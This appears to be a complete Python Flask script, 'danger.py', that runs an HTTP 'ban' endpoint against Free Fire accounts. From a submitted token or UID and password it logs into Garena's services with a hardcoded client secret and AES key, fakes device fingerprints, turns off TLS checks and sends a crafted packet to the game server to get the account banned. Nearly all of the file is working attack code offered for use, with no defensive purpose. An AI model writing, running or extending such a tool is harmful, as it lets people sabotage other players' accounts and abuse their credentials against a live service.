# danger.py - Ultimate FreeFire Ban API
import os
import sys
import time
import json
import base64
import socket
import urllib.parse
import traceback
import warnings
from datetime import datetime
from flask import Flask, request, jsonify

# Suppress warnings
warnings.filterwarnings('ignore')

# Crypto imports
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad, unpad

# JWT
import jwt

# Requests
import requests

# ------------------------------------------------------------
# Embedded protobuf definitions (no separate files needed)
# ------------------------------------------------------------
MY_PB2_DESCRIPTOR = b'\n\x08my.proto\"\xae\t\n\x08GameData\x12\x11\n\ttimestamp\x18\x03 \x01(\t\x12\x11\n\tgame_name\x18\x04 \x01(\t\x12\x14\n\x0cgame_version\x18\x05 \x01(\x05\x12\x14\n\x0cversion_code\x18\x07 \x01(\t\x12\x0f\n\x07os_info\x18\x08 \x01(\t\x12\x13\n\x0b\x64\x65vice_type\x18\t \x01(\t\x12\x18\n\x10network_provider\x18\n \x01(\t\x12\x17\n\x0f\x63onnection_type\x18\x0b \x01(\t\x12\x14\n\x0cscreen_width\x18\x0c \x01(\x05\x12\x15\n\rscreen_height\x18\r \x01(\x05\x12\x0b\n\x03\x64pi\x18\x0e \x01(\t\x12\x10\n\x08\x63pu_info\x18\x0f \x01(\t\x12\x11\n\ttotal_ram\x18\x10 \x01(\x05\x12\x10\n\x08gpu_name\x18\x11 \x01(\t\x12\x13\n\x0bgpu_version\x18\x12 \x01(\t\x12\x0f\n\x07user_id\x18\x13 \x01(\t\x12\x12\n\nip_address\x18\x14 \x01(\t\x12\x10\n\x08language\x18\x15 \x01(\t\x12\x0f\n\x07open_id\x18\x16 \x01(\t\x12\x15\n\rplatform_type\x18\x17 \x01(\x05\x12\x1a\n\x12\x64\x65vice_form_factor\x18\x18 \x01(\t\x12\x14\n\x0c\x64\x65vice_model\x18\x19 \x01(\t\x12\x14\n\x0c\x61\x63\x63\x65ss_token\x18\x1d \x01(\t\x12\x18\n\x10unknown_field_30\x18\x1e \x01(\x05\x12\"\n\x1asecondary_network_provider\x18) \x01(\t\x12!\n\x19secondary_connection_type\x18* \x01(\t\x12\x11\n\tunique_id\x18\x39 \x01(\t\x12\x10\n\x08\x66ield_60\x18< \x01(\x05\x12\x10\n\x08\x66ield_61\x18= \x01(\x05\x12\x10\n\x08\x66ield_62\x18> \x01(\x05\x12\x10\n\x08\x66ield_63\x18? \x01(\x05\x12\x10\n\x08\x66ield_64\x18@ \x01(\x05\x12\x10\n\x08\x66ield_65\x18\x41 \x01(\x05\x12\x10\n\x08\x66ield_66\x18\x42 \x01(\x05\x12\x10\n\x08\x66ield_67\x18\x43 \x01(\x05\x12\x10\n\x08\x66ield_70\x18\x46 \x01(\x05\x12\x10\n\x08\x66ield_73\x18I \x01(\x05\x12\x14\n\x0clibrary_path\x18J \x01(\t\x12\x10\n\x08\x66ield_76\x18L \x01(\x05\x12\x10\n\x08\x61pk_info\x18M \x01(\t\x12\x10\n\x08\x66ield_78\x18N \x01(\x05\x12\x10\n\x08\x66ield_79\x18O \x01(\x05\x12\x17\n\x0fos_architecture\x18Q \x01(\t\x12\x14\n\x0c\x62uild_number\x18S \x01(\t\x12\x10\n\x08\x66ield_85\x18U \x01(\x05\x12\x18\n\x10graphics_backend\x18V \x01(\t\x12\x19\n\x11max_texture_units\x18W \x01(\x05\x12\x15\n\rrendering_api\x18X \x01(\x05\x12\x18\n\x10\x65ncoded_field_89\x18Y \x01(\t\x12\x10\n\x08\x66ield_92\x18\\ \x01(\x05\x12\x13\n\x0bmarketplace\x18] \x01(\t\x12\x16\n\x0e\x65ncryption_key\x18^ \x01(\t\x12\x15\n\rtotal_storage\x18_ \x01(\x05\x12\x10\n\x08\x66ield_97\x18\x61 \x01(\x05\x12\x10\n\x08\x66ield_98\x18\x62 \x01(\x05\x12\x10\n\x08\x66ield_99\x18\x63 \x01(\t\x12\x11\n\tfield_100\x18\x64 \x01(\tb\x06proto3'

OUTPUT_PB2_DESCRIPTOR = b'\n\x13jwt_generator.proto\"\xd2\x02\n\nGarena_420\x12\x12\n\naccount_id\x18\x01 \x01(\x03\x12\x0e\n\x06region\x18\x02 \x01(\t\x12\r\n\x05place\x18\x03 \x01(\t\x12\x10\n\x08location\x18\x04 \x01(\t\x12\x0e\n\x06status\x18\x05 \x01(\t\x12\r\n\x05token\x18\x08 \x01(\t\x12\n\n\x02id\x18\t \x01(\x05\x12\x0b\n\x03\x61pi\x18\n \x01(\t\x12\x0e\n\x06number\x18\x0c \x01(\x05\x12\x1e\n\tGarena420\x18\x0f \x01(\x0b\x32\x0b.Garena_420\x12\x0c\n\x04\x61rea\x18\x10 \x01(\t\x12\x11\n\tmain_area\x18\x12 \x01(\t\x12\x0c\n\x04\x63ity\x18\x13 \x01(\t\x12\x0c\n\x04name\x18\x14 \x01(\t\x12\x11\n\ttimestamp\x18\x15 \x01(\x03\x12\x0e\n\x06\x62inary\x18\x16 \x01(\x0c\x12\x13\n\x0b\x62inary_data\x18\x17 \x01(\x0c\x1a\"\n\x12\x44\x65\x63rypted_Payloads\x12\x0c\n\x04type\x18\x01 \x01(\x05\x62\x06proto3'

# Try to load protobuf classes dynamically
try:
    from google.protobuf import descriptor_pool, message_factory
    _pool = descriptor_pool.Default()
    _pool.AddSerializedFile(MY_PB2_DESCRIPTOR)
    _pool.AddSerializedFile(OUTPUT_PB2_DESCRIPTOR)

    import types
    my_pb2 = types.ModuleType('my_pb2')
    my_pb2.GameData = message_factory.GetMessageClass(_pool.FindMessageTypeByName('GameData'))

    output_pb2 = types.ModuleType('output_pb2')
    output_pb2.Garena_420 = message_factory.GetMessageClass(_pool.FindMessageTypeByName('Garena_420'))

    WEB_PROTOBUF_AVAILABLE = True
    print("[✓] Embedded protobuf loaded successfully")
except Exception as e:
    print(f"[!] Failed to load embedded protobuf: {e}")
    WEB_PROTOBUF_AVAILABLE = False
    my_pb2 = None
    output_pb2 = None

# Optional cfonts (not critical for API)
try:
    from cfonts import render
    CFONTS_AVAILABLE = True
except ImportError:
    CFONTS_AVAILABLE = False

# Constants
MAX_RETRIES = 3
RETRY_DELAY = 2

KEY = bytes([89, 103, 38, 116, 99, 37, 68, 69, 117, 104, 54, 37, 90, 99, 94, 56])
IV = bytes([54, 111, 121, 90, 68, 114, 50, 50, 69, 51, 121, 99, 104, 106, 77, 37])

PLATFORM_DATA = {
    3: {"name": "Facebook", "icon": "FB", "color": "blue"},
    4: {"name": "Guest", "icon": "GU", "color": "gray"},
    5: {"name": "VK", "icon": "VK", "color": "cyan"},
    8: {"name": "Google", "icon": "GG", "color": "red"},
    10: {"name": "Apple", "icon": "AP", "color": "black"},
    11: {"name": "Twitter/X", "icon": "TW", "color": "cyan"}
}

# -------------------------------------------------------------------
# Helper functions (copied from original script, with prints removed or logged)
# -------------------------------------------------------------------

def safe_str(s):
    if isinstance(s, str):
        return s.encode('ascii', 'ignore').decode('ascii')
    return s

def safe_headers(headers_dict):
    safe = {}
    for key, value in headers_dict.items():
        safe[key] = safe_str(value)
    return safe

def b64url_decode(input_str: str) -> bytes:
    rem = len(input_str) % 4
    if rem:
        input_str += '=' * (4 - rem)
    return base64.urlsafe_b64decode(input_str)

def extract_jwt_payload_dict(jwt_s: str):
    try:
        parts = jwt_s.split('.')
        if len(parts) < 2:
            return None
        payload_b64 = parts[1]
        payload_bytes = b64url_decode(payload_b64)
        payload = json.loads(payload_bytes.decode('utf-8', errors='ignore'))
        if isinstance(payload, dict):
            return payload
    except Exception:
        pass
    return None

def encrypt_message(plaintext):
    try:
        cipher = AES.new(KEY, AES.MODE_CBC, IV)
        padded_message = pad(plaintext, AES.block_size)
        return cipher.encrypt(padded_message)
    except Exception as e:
        raise Exception(f"Encryption error: {e}")

# -------------------------------------------------------------------
# SimpleProtobuf class (unchanged)
# -------------------------------------------------------------------
class SimpleProtobuf:
    @staticmethod
    def encode_varint(value):
        result = bytearray()
        while value > 0x7F:
            result.append((value & 0x7F) | 0x80)
            value >>= 7
        result.append(value & 0x7F)
        return bytes(result)
    
    @staticmethod
    def decode_varint(data, start_index=0):
        value = 0
        shift = 0
        index = start_index
        while index < len(data):
            byte = data[index]
            index += 1
            value |= (byte & 0x7F) << shift
            if not (byte & 0x80):
                break
            shift += 7
        return value, index
    
    @staticmethod
    def parse_protobuf(data):
        result = {}
        index = 0
        while index < len(data):
            if index >= len(data):
                break
            tag = data[index]
            field_num = tag >> 3
            wire_type = tag & 0x07
            index += 1
            if wire_type == 0:
                value, index = SimpleProtobuf.decode_varint(data, index)
                result[field_num] = value
            elif wire_type == 2:
                length, index = SimpleProtobuf.decode_varint(data, index)
                if index + length <= len(data):
                    value_bytes = data[index:index + length]
                    index += length
                    try:
                        result[field_num] = value_bytes.decode('utf-8')
                    except:
                        result[field_num] = value_bytes
            else:
                break
        return result
    
    @staticmethod
    def encode_string(field_number, value):
        if isinstance(value, str):
            value = value.encode('utf-8')
        result = bytearray()
        result.extend(SimpleProtobuf.encode_varint((field_number << 3) | 2))
        result.extend(SimpleProtobuf.encode_varint(len(value)))
        result.extend(value)
        return bytes(result)
    
    @staticmethod
    def encode_int32(field_number, value):
        result = bytearray()
        result.extend(SimpleProtobuf.encode_varint((field_number << 3) | 0))
        result.extend(SimpleProtobuf.encode_varint(value))
        return bytes(result)
    
    @staticmethod
    def create_login_payload(open_id, access_token, platform, client_version, ob_version):
        payload = bytearray()
        current_time = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        payload.extend(SimpleProtobuf.encode_string(3, current_time))
        payload.extend(SimpleProtobuf.encode_string(4, 'free fire'))
        payload.extend(SimpleProtobuf.encode_int32(5, 1))
        payload.extend(SimpleProtobuf.encode_string(7, client_version))
        payload.extend(SimpleProtobuf.encode_string(8, 'Android OS 12 / API-31 (SP1A.210812.016/T505NDXS6CXB1)'))
        payload.extend(SimpleProtobuf.encode_string(9, 'Handheld'))
        payload.extend(SimpleProtobuf.encode_string(10, 'we'))
        payload.extend(SimpleProtobuf.encode_string(11, 'WIFI'))
        payload.extend(SimpleProtobuf.encode_int32(12, 1334))
        payload.extend(SimpleProtobuf.encode_int32(13, 800))
        payload.extend(SimpleProtobuf.encode_string(14, '225'))
        payload.extend(SimpleProtobuf.encode_string(15, 'ARM64 FP ASIMD AES | 4032 | 8'))
        payload.extend(SimpleProtobuf.encode_int32(16, 2705))
        payload.extend(SimpleProtobuf.encode_string(17, 'Adreno (TM) 610'))
        payload.extend(SimpleProtobuf.encode_string(18, 'OpenGL ES 3.2 V@0502.0 (GIT@5eaa426211, I07ee46fc66, 1633700387) (Date:10/08/21)'))
        payload.extend(SimpleProtobuf.encode_string(19, 'Google|dbc5b426-9715-454a-9466-6c82e151d407'))
        payload.extend(SimpleProtobuf.encode_string(20, '154.183.6.12'))
        payload.extend(SimpleProtobuf.encode_string(21, 'ar'))
        payload.extend(SimpleProtobuf.encode_string(22, open_id))
        payload.extend(SimpleProtobuf.encode_string(23, str(platform)))
        payload.extend(SimpleProtobuf.encode_string(24, 'Handheld'))
        payload.extend(SimpleProtobuf.encode_string(25, 'samsung SM-T505N'))
        payload.extend(SimpleProtobuf.encode_string(29, access_token))
        payload.extend(SimpleProtobuf.encode_int32(30, 1))
        payload.extend(SimpleProtobuf.encode_string(41, 'we'))
        payload.extend(SimpleProtobuf.encode_string(42, 'WIFI'))
        payload.extend(SimpleProtobuf.encode_string(57, 'e89b158e4bcf988ebd09eb83f5378e87'))
        payload.extend(SimpleProtobuf.encode_int32(60, 22394))
        payload.extend(SimpleProtobuf.encode_int32(61, 1424))
        payload.extend(SimpleProtobuf.encode_int32(62, 3349))
        payload.extend(SimpleProtobuf.encode_int32(63, 24))
        payload.extend(SimpleProtobuf.encode_int32(64, 1552))
        payload.extend(SimpleProtobuf.encode_int32(65, 22394))
        payload.extend(SimpleProtobuf.encode_int32(66, 1552))
        payload.extend(SimpleProtobuf.encode_int32(67, 22394))
        payload.extend(SimpleProtobuf.encode_int32(73, 1))
        payload.extend(SimpleProtobuf.encode_string(74, '/data/app/~~lqYdjEs9bd43CagTaQ9JPg==/com.dts.freefiremax-i72Sh_-sI0zZHs5Bw6aufg==/lib/arm64'))
        payload.extend(SimpleProtobuf.encode_int32(76, 2))
        payload.extend(SimpleProtobuf.encode_string(77, 'b4d2689433917e66100ba91db790bf37|/data/app/~~lqYdjEs9bd43CagTaQ9JPg==/com.dts.freefiremax-i72Sh_-sI0zZHs5Bw6aufg==/base.apk'))
        payload.extend(SimpleProtobuf.encode_int32(78, 2))
        payload.extend(SimpleProtobuf.encode_int32(79, 2))
        payload.extend(SimpleProtobuf.encode_string(81, '64'))
        payload.extend(SimpleProtobuf.encode_string(83, '2019115296'))
        payload.extend(SimpleProtobuf.encode_int32(85, 1))
        payload.extend(SimpleProtobuf.encode_string(86, 'OpenGLES3'))
        payload.extend(SimpleProtobuf.encode_int32(87, 16383))
        payload.extend(SimpleProtobuf.encode_int32(88, 4))
        payload.extend(SimpleProtobuf.encode_string(90, 'Damanhur'))
        payload.extend(SimpleProtobuf.encode_string(91, 'BH'))
        payload.extend(SimpleProtobuf.encode_int32(92, 31095))
        payload.extend(SimpleProtobuf.encode_string(93, 'android_max'))
        payload.extend(SimpleProtobuf.encode_string(94, 'KqsHTzpfADfqKnEg/KMctJLElsm8bN2M4ts0zq+ifY+560USyjMSDL386RFrwRloT0ZSbMxEuM+Y4FSvjghQQZXWWpY='))
        payload.extend(SimpleProtobuf.encode_int32(97, 1))
        payload.extend(SimpleProtobuf.encode_int32(98, 1))
        payload.extend(SimpleProtobuf.encode_string(99, str(platform)))
        payload.extend(SimpleProtobuf.encode_string(100, str(platform)))
        payload.extend(SimpleProtobuf.encode_string(102, ''))
        return bytes(payload)

# -------------------------------------------------------------------
# Core functions (adapted from original)
# -------------------------------------------------------------------

def get_available_room(input_text):
    try:
        data = bytes.fromhex(input_text)
        result = {}
        index = 0
        while index < len(data):
            if index >= len(data):
                break
            tag = data[index]
            field_num = tag >> 3
            wire_type = tag & 0x07
            index += 1
            if wire_type == 0:
                value = 0
                shift = 0
                while index < len(data):
                    byte = data[index]
                    index += 1
                    value |= (byte & 0x7F) << shift
                    if not (byte & 0x80):
                        break
                    shift += 7
                result[str(field_num)] = {"wire_type": "varint", "data": value}
            elif wire_type == 2:
                length = 0
                shift = 0
                while index < len(data):
                    byte = data[index]
                    index += 1
                    length |= (byte & 0x7F) << shift
                    if not (byte & 0x80):
                        break
                    shift += 7
                if index + length <= len(data):
                    value_bytes = data[index:index + length]
                    index += length
                    try:
                        value_str = value_bytes.decode('utf-8')
                        result[str(field_num)] = {"wire_type": "string", "data": value_str}
                    except:
                        result[str(field_num)] = {"wire_type": "bytes", "data": value_bytes.hex()}
            else:
                break
        return json.dumps(result)
    except Exception as e:
        return None

def encrypt_packet(hex_string: str, aes_key, aes_iv) -> str:
    if isinstance(aes_key, str):
        aes_key = bytes.fromhex(aes_key)
    if isinstance(aes_iv, str):
        aes_iv = bytes.fromhex(aes_iv)
    data = bytes.fromhex(hex_string)
    cipher = AES.new(aes_key, AES.MODE_CBC, aes_iv)
    encrypted = cipher.encrypt(pad(data, AES.block_size))
    return encrypted.hex()

def build_start_packet(account_id: int, timestamp: int, jwt: str, key, iv) -> str:
    try:
        encrypted = encrypt_packet(jwt.encode().hex(), key, iv)
        head_len = hex(len(encrypted) // 2)[2:]
        ide_hex = hex(int(account_id))[2:]
        zeros = "0" * (16 - len(ide_hex))
        timestamp_hex = hex(timestamp)[2:].zfill(16)
        head = f"0115{zeros}{ide_hex}{timestamp_hex}00000{head_len}"
        start_packet = head + encrypted
        return start_packet
    except Exception as e:
        raise Exception(f"Error building start packet: {e}")

# -------------------- OAuth / Token methods --------------------

def get_access_token_from_uid(uid, password):
    url = "https://100067.connect.garena.com/oauth/guest/token/grant"
    payload = {
        'uid': safe_str(uid),
        'password': safe_str(password),
        'response_type': "token",
        'client_type': "2",
        'client_secret': "2ee44819e9b4598845141067b281621874d0d5d7af9d8f7e00c1e54715b7d1e3",
        'client_id': "100067"
    }
    headers = {
        'User-Agent': "GarenaMSDK/4.0.19P9(SM-M526B ;Android 13;pt;BR;)",
        'Connection': "Keep-Alive",
        'Accept-Encoding': "gzip"
    }
    for attempt in range(MAX_RETRIES):
        try:
            response = requests.post(url, data=payload, headers=safe_headers(headers), timeout=10)
            if response.status_code == 200:
                data = response.json()
                if 'access_token' in data and 'open_id' in data:
                    return {
                        'access_token': data['access_token'],
                        'open_id': data['open_id'],
                        'platform': data.get('platform', 4)
                    }
        except Exception:
            pass
        if attempt < MAX_RETRIES - 1:
            time.sleep(RETRY_DELAY * (2 ** attempt))
    return None

def inspect_access_token(access_token):
    url = f"https://100067.connect.garena.com/oauth/token/inspect?token={safe_str(access_token)}"
    headers = {
        "User-Agent": "GarenaMSDK/4.0.19P4(G011A ;Android 9;en;US;)",
        "Accept": "application/json",
    }
    for attempt in range(MAX_RETRIES):
        try:
            response = requests.get(url, headers=safe_headers(headers), timeout=10, verify=False)
            if response.status_code == 200:
                data = response.json()
                open_id = data.get('open_id')
                platform = data.get('platform', 4)
                uid = data.get('uid') or data.get('user_id')
                return {
                    'open_id': open_id,
                    'platform': platform,
                    'uid': uid
                }
        except Exception:
            pass
        if attempt < MAX_RETRIES - 1:
            time.sleep(RETRY_DELAY * (2 ** attempt))
    return None

def extract_eat_from_url(url):
    try:
        parsed = urllib.parse.urlparse(url)
        params = urllib.parse.parse_qs(parsed.query)
        if 'eat' in params:
            return params['eat'][0]
        if 'access_token' in params:
            return params['access_token'][0]
        if 'token' in params:
            return params['token'][0]
    except:
        pass
    return None

def convert_eat_to_access_token(eat_token):
    for attempt in range(MAX_RETRIES):
        try:
            callback_url = f"https://api-otrss.garena.com/support/callback/?access_token={safe_str(eat_token)}"
            response = requests.get(callback_url, allow_redirects=True, timeout=30, verify=False)
            if 'help.garena.com' in response.url:
                parsed = urllib.parse.urlparse(response.url)
                params = urllib.parse.parse_qs(parsed.query)
                if 'access_token' in params:
                    access_token = params['access_token'][0]
                    token_info = inspect_access_token(access_token)
                    if token_info:
                        return {
                            'access_token': access_token,
                            'open_id': token_info['open_id'],
                            'platform': token_info['platform'],
                            'uid': token_info['uid']
                        }
        except Exception:
            pass
        if attempt < MAX_RETRIES - 1:
            time.sleep(RETRY_DELAY * (2 ** attempt))
    return None

def process_jwt_token(jwt_token):
    payload = extract_jwt_payload_dict(jwt_token)
    if not payload:
        return None
    return {
        'account_id': payload.get('account_id'),
        'nickname': payload.get('nickname'),
        'lock_region': payload.get('lock_region'),
        'platform': payload.get('plat_id'),
        'jwt_token': jwt_token
    }

# -------------------- MajorLogin --------------------

def major_login(access_token, open_id, platform_type=4, client_version="1.123.1"):
    if not WEB_PROTOBUF_AVAILABLE:
        raise Exception("my_pb2/output_pb2 not available")

    game_data = my_pb2.GameData()
    game_data.timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    game_data.game_name = "free fire"
    game_data.game_version = 1
    game_data.version_code = client_version
    game_data.os_info = "Android OS 9 / API-28 (PI/rel.cjw.20220518.114133)"
    game_data.device_type = "Handheld"
    game_data.network_provider = "Verizon Wireless"
    game_data.connection_type = "WIFI"
    game_data.screen_width = 1280
    game_data.screen_height = 960
    game_data.dpi = "240"
    game_data.cpu_info = "ARMv7 VFPv3 NEON VMH | 2400 | 4"
    game_data.total_ram = 5951
    game_data.gpu_name = "Adreno (TM) 640"
    game_data.gpu_version = "OpenGL ES 3.0"
    game_data.user_id = "Google|74b585a9-0268-4ad3-8f36-ef41d2e53610"
    game_data.ip_address = "172.190.111.97"
    game_data.language = "en"
    game_data.open_id = open_id
    game_data.access_token = access_token
    game_data.platform_type = platform_type
    game_data.field_99 = str(platform_type)
    game_data.field_100 = str(platform_type)

    serialized_data = game_data.SerializeToString()
    if not serialized_data:
        raise Exception("Serialized data empty")

    encrypted_data = encrypt_message(serialized_data)
    if not encrypted_data:
        raise Exception("Encryption failed")

    endpoints = [
        "https://loginbp.ggpolarbear.com/MajorLogin",
        "https://loginbp.ggblueshark.com/MajorLogin",
        "https://loginbp.common.ggbluefox.com/MajorLogin"
    ]

    for endpoint in endpoints:
        headers = {
            "User-Agent": "Dalvik/2.1.0 (Linux; U; Android 9; ASUS_Z01QD Build/PI)",
            "Connection": "Keep-Alive",
            "Accept-Encoding": "gzip",
            "Content-Type": "application/octet-stream",
            "Expect": "100-continue",
            "X-Unity-Version": "2018.4.11f1",
            "X-GA": "v1 1",
            "ReleaseVersion": "OB53"
        }
        try:
            response = requests.post(endpoint, data=encrypted_data, headers=headers, verify=False, timeout=15)
            if response.status_code == 200:
                content = response.content
                resp_msg = output_pb2.Garena_420()
                resp_msg.ParseFromString(content)
                if hasattr(resp_msg, 'token') and resp_msg.token:
                    jwt_token = resp_msg.token
                    jwt_payload = extract_jwt_payload_dict(jwt_token)
                    if jwt_payload:
                        account_id = resp_msg.account_id if hasattr(resp_msg, 'account_id') and resp_msg.account_id else jwt_payload.get('account_id')
                        key_from_response = KEY
                        iv_from_response = IV
                        if hasattr(resp_msg, 'binary') and resp_msg.binary and len(resp_msg.binary) >= 32:
                            key_from_response = resp_msg.binary[:16]
                            iv_from_response = resp_msg.binary[16:32]
                        elif hasattr(resp_msg, 'binary_data') and resp_msg.binary_data and len(resp_msg.binary_data) >= 32:
                            key_from_response = resp_msg.binary_data[:16]
                            iv_from_response = resp_msg.binary_data[16:32]
                        return {
                            'success': True,
                            'method': 'major_login',
                            'account_id': account_id,
                            'jwt_token': jwt_token,
                            'key': key_from_response,
                            'iv': iv_from_response,
                            'jwt_payload': jwt_payload,
                            'endpoint': endpoint
                        }
        except Exception:
            continue
    raise Exception("All MajorLogin endpoints failed")

# -------------------- GetLoginData --------------------

def get_login_data_with_jwt(jwt_token, ob_version, lock_region=None, enc_data=None):
    if not lock_region:
        jwt_payload = extract_jwt_payload_dict(jwt_token)
        if jwt_payload:
            lock_region = jwt_payload.get('lock_region', '').upper()
        else:
            lock_region = ''

    if lock_region == "IND":
        url = "https://client.ind.freefiremobile.com/GetLoginData"
        host = "client.ind.freefiremobile.com"
    elif lock_region in ["BR", "US", "NA", "SAC"]:
        url = "https://client.us.freefiremobile.com/GetLoginData"
        host = "client.us.freefiremobile.com"
    else:
        url = "https://clientbp.ggpolarbear.com/GetLoginData"
        host = "clientbp.ggblueshark.com"

    headers = {
        'Expect': '100-continue',
        'Authorization': f'Bearer {jwt_token}',
        'X-Unity-Version': '2018.4.11f1',
        'X-GA': 'v1 1',
        'ReleaseVersion': ob_version,
        'Content-Type': 'application/x-www-form-urlencoded',
        'User-Agent': 'Dalvik/2.1.0 (Linux; U; Android 9; G011A Build/PI)',
        'Host': host,
        'Connection': 'close',
        'Accept-Encoding': 'gzip, deflate, br',
    }

    for attempt in range(MAX_RETRIES):
        try:
            if enc_data is None:
                dummy_payload = SimpleProtobuf.create_login_payload("dummy", "dummy", "4", "1.123.1", ob_version)
                dummy_padded = pad(dummy_payload, 16)
                cipher = AES.new(KEY, AES.MODE_CBC, IV)
                enc_data = cipher.encrypt(dummy_padded)

            response = requests.post(url, headers=headers, data=enc_data, timeout=12, verify=False)
            if response.status_code == 200:
                x = response.content.hex()
                json_result = get_available_room(x)
                if json_result:
                    parsed = json.loads(json_result)
                    if '14' in parsed and 'data' in parsed['14']:
                        online_address = parsed['14']['data']
                        online_ip = online_address[:len(online_address) - 6]
                        online_port = int(online_address[len(online_address) - 5:])
                        return {
                            'online_ip': online_ip,
                            'online_port': online_port,
                            'region': lock_region,
                            'endpoint_used': url
                        }
        except Exception:
            pass
        if attempt < MAX_RETRIES - 1:
            time.sleep(RETRY_DELAY * (2 ** attempt))
    raise Exception("GetLoginData failed after retries")

# -------------------- Game Server Connection --------------------

def connect_to_game_server(account_id, timestamp, jwt_token, key, iv, online_ip, online_port):
    for attempt in range(MAX_RETRIES):
        try:
            final_packet = build_start_packet(account_id, timestamp, jwt_token, key, iv)
            if not final_packet:
                raise Exception("Failed to build packet")
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(10)
            sock.connect((online_ip, online_port))
            packet_bytes = bytes.fromhex(final_packet)
            sock.send(packet_bytes)
            # Wait briefly for response or timeout
            try:
                sock.recv(4096)
            except socket.timeout:
                pass
            sock.close()
            return True
        except Exception:
            if attempt < MAX_RETRIES - 1:
                time.sleep(RETRY_DELAY * (2 ** attempt))
            else:
                raise Exception(f"Failed to connect to game server after {MAX_RETRIES} attempts")
    return False

# -------------------------------------------------------------------
# Main orchestration function
# -------------------------------------------------------------------

def perform_ban(eat=None, access=None, uid=None, password=None, token=None,
                client_version="1.123.1", ob_version="OB53"):
    """
    Returns a dict with result or raises exception.
    """
    result = {
        'success': False,
        'method_used': None,
        'account_info': {},
        'server_info': {},
        'jwt': None,
        'key': None,
        'iv': None,
        'message': ''
    }

    # Step 1: Obtain access token or JWT based on input
    login_data = None
    if token:
        # Direct JWT
        jwt_info = process_jwt_token(token)
        if not jwt_info:
            raise Exception("Invalid JWT token")
        result['method_used'] = 'jwt'
        result['account_info'] = jwt_info
        jwt_token = token
        account_id = jwt_info['account_id']
        lock_region = jwt_info['lock_region']
        # No major login needed for JWT method
        major_result = None
    elif access:
        # Access token
        token_info = inspect_access_token(access)
        if not token_info:
            raise Exception("Invalid access token")
        login_data = {
            'access_token': access,
            'open_id': token_info['open_id'],
            'platform': token_info['platform'],
            'uid': token_info['uid']
        }
        result['method_used'] = 'access_token'
        result['account_info'] = token_info
        # Proceed to major login
        major_result = major_login(login_data['access_token'], login_data['open_id'],
                                   login_data['platform'], client_version)
    elif eat:
        # EAT token
        token_data = convert_eat_to_access_token(eat)
        if not token_data:
            raise Exception("Failed to convert EAT token")
        login_data = token_data
        result['method_used'] = 'eat'
        result['account_info'] = {
            'open_id': token_data['open_id'],
            'platform': token_data['platform'],
            'uid': token_data['uid']
        }
        major_result = major_login(login_data['access_token'], login_data['open_id'],
                                   login_data['platform'], client_version)
    elif uid and password:
        # UID + password
        token_data = get_access_token_from_uid(uid, password)
        if not token_data:
            raise Exception("Invalid UID or password")
        login_data = token_data
        result['method_used'] = 'uid_password'
        result['account_info'] = {
            'open_id': token_data['open_id'],
            'platform': token_data['platform'],
            'uid': uid
        }
        major_result = major_login(login_data['access_token'], login_data['open_id'],
                                   login_data['platform'], client_version)
    else:
        raise Exception("No valid authentication parameters provided")

    # Step 2: If we have major_result (i.e., not JWT method), extract JWT and keys
    if major_result:
        jwt_token = major_result['jwt_token']
        key = major_result['key']
        iv = major_result['iv']
        account_id = major_result['account_id']
        lock_region = major_result['jwt_payload'].get('lock_region')
        # Prepare encrypted data for GetLoginData using the original access token
        data_pb = SimpleProtobuf.create_login_payload(
            login_data['open_id'],
            login_data['access_token'],
            str(login_data['platform']),
            client_version,
            ob_version
        )
        data_padded = pad(data_pb, 16)
        cipher = AES.new(KEY, AES.MODE_CBC, IV)
        enc_data = cipher.encrypt(data_padded)
    else:
        # JWT method: use default key/iv, no enc_data needed (dummy will be used)
        key = KEY
        iv = IV
        enc_data = None

    # Step 3: Get login data (server IP/port)
    login_info = get_login_data_with_jwt(jwt_token, ob_version, lock_region, enc_data)
    result['server_info'] = login_info

    # Step 4: Determine timestamp
    jwt_payload = extract_jwt_payload_dict(jwt_token)
    if jwt_payload and 'exp' in jwt_payload:
        timestamp = jwt_payload['exp'] * 1000000000
    else:
        timestamp = int(time.time() * 1000000000)

    # Step 5: Connect to game server
    connection_success = connect_to_game_server(
        account_id=account_id,
        timestamp=timestamp,
        jwt_token=jwt_token,
        key=key,
        iv=iv,
        online_ip=login_info['online_ip'],
        online_port=login_info['online_port']
    )

    result['success'] = connection_success
    result['jwt'] = jwt_token
    result['key'] = key.hex()
    result['iv'] = iv.hex()
    result['account_id'] = account_id
    result['message'] = 'Ban process initiated' if connection_success else 'Connection attempted but may have failed'
    return result

# -------------------------------------------------------------------
# Flask App
# -------------------------------------------------------------------
app = Flask(__name__)

@app.route('/ban', methods=['GET'])
def ban():
    try:
        eat = request.args.get('eat')
        access = request.args.get('access')
        uid = request.args.get('uid')
        password = request.args.get('password')
        token = request.args.get('token')
        client_version = request.args.get('client_version', '1.123.1')
        ob_version = request.args.get('ob_version', 'OB53')

        result = perform_ban(
            eat=eat,
            access=access,
            uid=uid,
            password=password,
            token=token,
            client_version=client_version,
            ob_version=ob_version
        )
        return jsonify(result), 200
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)}), 400

if __name__ == '__main__':
    port = int(os.environ.get('PORT', 5000))
    app.run(host='0.0.0.0', port=port)